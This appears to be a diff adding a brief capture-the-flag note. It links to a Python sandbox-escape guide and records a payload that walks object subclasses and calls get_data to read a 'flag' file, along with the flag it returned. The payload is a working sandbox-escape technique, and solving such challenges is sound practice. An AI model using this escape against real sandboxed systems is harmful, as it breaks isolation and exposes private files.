@@ -1,0 +1,6 @@
+https://note.tonycrane.cc/ctf/misc/escapes/pysandbox/#object
+
+[].__class__.__base__.__subclasses__()
+
+[].__class__.__base__.__subclasses__()[99].get_data("","flag")      
+b'flag{5779d077-24f8-4879-af6f-28232790ae9f}\n'
